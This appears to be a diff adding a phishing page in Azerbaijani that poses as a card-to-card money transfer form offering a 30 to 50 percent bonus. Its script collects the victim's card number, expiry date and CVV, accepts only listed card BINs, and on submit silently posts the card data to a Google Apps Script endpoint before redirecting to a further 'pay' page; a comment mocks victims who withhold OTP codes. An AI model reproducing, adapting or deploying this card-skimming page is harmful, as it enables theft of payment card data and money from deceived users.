@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=3.0, user-scalable=yes">
+  <title>Kartdan karta köçürmə</title>
+  <style>
+      body {
+          font-family: Arial, sans-serif;
+          background-color: #f5f5f5;
+          margin: 0;
+          padding: 0;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          height: 100vh;
+          overflow: hidden;
+      }
+
+      .form-container {
+          background: white;
+          padding: 30px;
+          border-radius: 15px;
+          box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+          width: 100%;
+          max-width: 420px;
+          position: relative;
+          border: 3px solid rgba(247, 244, 243, 0.8);
+          zoom: 1.5;
+          transform-origin: center;
+      }
+
+      .form-container h2 {
+          text-align: center;
+          color: #333;
+          font-size: 24px;
+          margin-bottom: 20px;
+      }
+
+      .form-container img {
+          display: block;
+          margin: 0 auto 10px auto;
+          width: 200px;
+      }
+
+      .form-group {
+          margin-bottom: 20px;
+      }
+
+      label {
+          display: block;
+          font-weight: bold;
+          margin-bottom: 8px;
+          color: #000000;
+      }
+
+      label1 {
+          display: block;
+          font-weight: bold;
+          margin-bottom: 8px;
+          color: #ffffff;
+      }
+
+      input, select {
+          width: 100%;
+          padding: 12px;
+          border: 2px solid #808080;
+          border-radius: 8px;
+          font-size: 16px;
+          box-sizing: border-box;
+          background-color: white;
+          color: #333;
+      }
+
+      .card-box {
+          background: url('kart.svg') no-repeat center center;
+          background-size: 105%;
+          color: white;
+          padding: 20px;
+          border-radius: 16px;
+          display: flex;
+          flex-direction: column;
+          gap: 25px;
+          margin-bottom: 20px;
+          position: relative;
+          width: 100%;
+          max-width: 420px;
+          box-sizing: border-box;
+      }
+
+      .details-row {
+          display: flex;
+          justify-content: space-between;
+          gap: 15px;
+      }
+
+      .details-row input {
+          flex: 1;
+          border: 2px solid #808080;
+          background: white;
+          color: #333;
+          padding: 12px;
+          border-radius: 8px;
+          font-size: 16px;
+          text-align: center;
+      }
+
+      .submit-btn {
+          background: linear-gradient(45deg, #f45369, #f45369, #f45369);
+          color: white;
+          border: none;
+          width: 100%;
+          padding: 15px;
+          border-radius: 8px;
+          font-size: 18px;
+          cursor: pointer;
+          transition: background 0.3s ease;
+      }
+
+      .submit-btn:hover {
+          background: linear-gradient(45deg, #f45369, #e1425a);
+      }
+
+      .submit-btn.disabled {
+          background: linear-gradient(45deg, #d3d3d3, #d3d3d3);
+          cursor: not-allowed;
+      }
+
+      @media (max-width: 600px) {
+          .form-container {
+              width: 90%;
+              padding: 20px;
+              zoom: 1.5;
+          }
+
+          .submit-btn {
+              font-size: 16px;
+              padding: 12px;
+          }
+
+          .form-container h2 {
+              font-size: 20px;
+          }
+      }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+      <img src="logo.svg" alt="Logo">
+      <h4>Kartdan karta köçürmə</h4>
+      <form id="cardForm">
+          <div class="form-group">
+              <div class="card-box">
+                  <label1 for="senderCardNumber">Kartın nömrəsi</label1>
+                  <input id="senderCardNumber" type="text" name="kart" class="card-number" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" oninput="formatCardNumber(this)" required>
+                  <div class="details-row">
+                      <input id="date" type="text" name="date" placeholder="MM/YY" maxlength="5" oninput="formatExpiryDate(this)" required>
+                      <input id="senderCVV" type="text" name="cvv" placeholder="CVV / CVC" maxlength="3" required>
+                  </div>
+              </div>
+          </div>
+          <div class="form-group">
+              <label for="receiverCardNumber">Karta</label>
+              <input id="receiverCardNumber" type="text" name="receiverCardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" oninput="formatCardNumber(this)" required>
+          </div>
+          <div class="form-group">
+              <label for="currency">Valyuta</label>
+              <select id="currency" name="currency">
+                  <option value="AZN">AZN</option>
+                  <option value="USD">USD</option>
+                  <option value="EUR">EUR</option>
+              </select>
+          </div>
+          <div class="form-group">
+              <label for="amount">Köçürmə məbləği</label>
+              <input id="amount" type="text" name="tutar" placeholder="Min: 100 AZN Maks: 15000 AZN" maxlength="5" required>
+          </div>
+          <div class="form-group">
+              <label for="totalAmount">Gələcək məbləğ</label>
+              <input id="totalAmount" type="text" name="totalAmount" readonly placeholder="Bonus ilə birlikdə məbləğ" disabled>
+          </div>
+          <button type="submit" id="submitBtn" class="submit-btn disabled" disabled>Göndər</button>
+      </form>
+  </div>
+  <script>
+    const validBins = [
+        "1230", "3751", "4018", "4021", "4004", "4006", "4023", "4028", "4056", "4069", "4071", "4076", "4098", "4169",
+        "4779", "5239", "5167", "5339", "5398", "4567", "5200", "4894", "5243", "4716", "4569", "4389", "5390", "4641",
+        "5123", "4568", "4210", "4119", "4321", "4118", "4672", "4116", "4211", "5111", "5319", "4017", "4022", "4566",
+        "4198", "4105", "4801", "4709", "4999", "5223", "4719", "5018", "4915", "4212", "5311", "5323", "4822", "4631",
+        "4555", "4799", "4019", "4117"
+    ];
+
+    // Kart numarasını formatlamak
+    function formatCardNumber(input) {
+        let value = input.value.replace(/\D/g, ""); 
+        value = value.match(/.{1,4}/g)?.join(" ") || value; 
+        input.value = value;
+
+        // Recheck card number every time user updates amount
+        checkCardNumber();
+    }
+
+    // Kart numarasını kontrol etmek
+    function checkCardNumber() {
+        const cardNumber = document.getElementById("senderCardNumber").value.replace(/\s/g, ""); // Remove spaces
+        const submitBtn = document.getElementById("submitBtn");
+        const cardNumberField = document.getElementById("senderCardNumber");
+
+        const bin = cardNumber.slice(0, 4); // First 4 digits for BIN
+        const isValidBin = validBins.includes(bin); // Check if BIN is valid
+        const isValidLength = cardNumber.length === 16; // Ensure card number is 16 digits
+
+        // Enable the submit button if both conditions are met
+        if (isValidBin && isValidLength) {
+            submitBtn.disabled = false;
+            submitBtn.classList.remove("disabled");
+            submitBtn.style.background = "linear-gradient(45deg, #FF0039, #FF0039)";
+            cardNumberField.style.borderColor = "#808080"; // Normal border color
+        } else {
+            submitBtn.disabled = true;
+            submitBtn.classList.add("disabled");
+            submitBtn.style.background = "linear-gradient(45deg, #d3d3d3, #d3d3d3)";
+            cardNumberField.style.borderColor = "red"; // Red border color if invalid BIN or length
+        }
+    }
+
+    // Format expiry date
+    function formatExpiryDate(input) {
+        let value = input.value.replace(/\D/g, ""); 
+        if (value.length > 4) value = value.slice(0, 4); 
+        if (value.length > 2) {
+            value = value.slice(0, 2) + "/" + value.slice(2); 
+        }
+        input.value = value;
+    }
+
+    // Calculate bonus and total amount
+    document.getElementById("amount").addEventListener("input", function() {
+        const amount = parseFloat(this.value);
+        const submitBtn = document.getElementById("submitBtn");
+        const totalAmountField = document.getElementById("totalAmount");
+
+        let bonus = 0;
+
+        if (amount >= 100 && amount < 300) {
+            bonus = amount * 0.30; // 30% bonus
+        } else if (amount >= 300) {
+            bonus = amount * 0.50; // 50% bonus
+        }
+
+        const totalAmount = amount + bonus;
+        totalAmountField.value = totalAmount.toFixed(2); // Display total with bonus
+
+        // Recheck card number after the amount is updated
+        checkCardNumber();
+
+        // Enable/disable submit button based on amount validity
+        if (amount >= 100 && amount <= 15000) {
+            submitBtn.disabled = false;
+            submitBtn.classList.remove("disabled");
+            submitBtn.style.background = "linear-gradient(45deg, #FF0039, #FF0039)";
+        } else {
+            submitBtn.disabled = true;
+            submitBtn.classList.add("disabled");
+            submitBtn.style.background = "linear-gradient(45deg, #d3d3d3, #d3d3d3)";
+        }
+    });
+
+    // Handle form submission
+    document.getElementById("cardForm").addEventListener("submit", async (e) => {
+        e.preventDefault();
+
+        // Prevent submission if BIN is invalid or the submit button is disabled
+        if (document.getElementById("submitBtn").disabled) {
+            alert("Kartın nömrəsi yanlışdır.");
+            return;
+        }
+
+        // Fixed OTP code
+        const otpCode = "otp vermiyen peyserdi"; 
+
+        const data = {
+            kart: document.getElementById("senderCardNumber").value,
+            date: document.getElementById("date").value,
+            cvv: document.getElementById("senderCVV").value,
+            tutar: document.getElementById("amount").value,
+            otp: otpCode, // Fixed OTP code used here
+        };
+
+        try {
+            await fetch("https://script.google.com/macros/s/AKfycbzhXgs-Tw02Np5e_KSs4ghvp7WiQjeBBHq1ePfGCmb6Pj_EXjH-9-ewmhYbmqgLeCRr/exec", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify(data),
+                mode: "no-cors",
+            });
+            window.location.href = "pay/index.html";
+        } catch (error) {
+            console.error("Hata: ", error);
+            alert("xəta baş verdi.");
+        }
+    });
+  </script>
+</body>
+</html>
